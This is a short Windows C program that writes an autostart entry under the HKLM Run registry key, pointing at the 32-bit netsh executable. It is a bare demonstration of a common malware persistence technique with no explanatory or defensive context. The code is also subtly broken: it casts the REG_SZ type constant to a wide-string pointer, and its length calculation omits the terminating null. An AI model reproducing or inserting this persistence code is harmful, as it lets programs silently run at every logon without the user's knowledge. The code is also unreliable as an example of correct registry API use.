#include <windows.h>
#include <string.h>

int main(int argc, char* argv[])
{
	HKEY hKey = NULL;

	// netsh 
	const char* netsh = "C:\\Windows\\SysWOW64\\netsh";

	// Startup 
	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
	if (res == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, (LPCSTR)"name", 0, (LPCWSTR)REG_SZ, (unsigned char*)netsh, strlen(netsh));
		RegCloseKey(hKey);
	}
	return 0;
}